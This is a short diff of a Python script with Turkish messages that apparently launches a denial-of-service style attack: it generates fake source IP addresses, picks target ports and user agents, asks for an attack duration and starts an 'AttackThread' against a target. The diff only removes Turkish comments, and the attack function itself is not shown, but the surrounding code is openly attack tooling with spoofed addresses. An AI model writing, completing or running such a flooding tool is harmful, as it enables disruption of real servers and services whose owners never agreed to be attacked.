@@ -7,7 +7,7 @@ import struct
 import traceback
 import time
 
-# Saldırının devam edip etmediğini kontrol etmek için bir threading.Event
+
 attack_event = threading.Event()
 
 def get_fake_ip_addresses(num_addresses):
@@ -115,13 +115,13 @@ def main():
             print("Geçersiz giriş. Sayısal bir değer giriniz.")
             sys.exit(1)
         fake_ip = input("Sahte IP Adresini Girin (Varsayılan: {}): ".format(fake_ips[0])) or fake_ips[0]
-        duration = get_attack_duration()  # Saldırı süresini al
+        duration = get_attack_duration()  
     else:
         fake_ip = fake_ips[0]
-        duration = get_attack_duration()  # Saldırı süresini al
+        duration = get_attack_duration() 
         port = random.choice(get_target_ports())
 
-    # Saldırıyı başlatan thread
+  
     t = threading.Thread(target=attack, args=(fake_ips, target, port, user_agents, duration), name="AttackThread")
     t.start()
 
@@ -130,11 +130,11 @@ def main():
     try:
         start_time = time.time()
         while not attack_event.is_set() and time.time() - start_time < duration:
-            time.sleep(1)  # 1 saniye boyunca bekleyerek süreyi kontrol et
+            time.sleep(1)  
         print("Saldırı süresi doldu...")
 
     except KeyboardInterrupt:
-        attack_event.set()  # Saldırıyı durdurmak için event'i set et
+        attack_event.set()  
         t.join()
         print("Saldırı durduruluyor...")
         traceback.print_exc()
